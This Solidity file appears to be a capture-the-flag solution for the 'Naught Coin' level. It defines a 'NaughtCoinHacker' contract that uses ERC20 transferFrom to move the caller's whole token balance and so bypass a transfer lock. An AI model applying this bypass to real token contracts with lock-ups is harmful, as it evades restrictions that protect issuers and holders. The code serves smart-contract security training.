// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

contract NaughtCoinHacker {
    function attack(address tokenAddr) public {
        ERC20 token = ERC20(tokenAddr);
        uint256 balance = token.balanceOf(msg.sender);
        token.transferFrom(msg.sender, address(this), balance);
    }
}
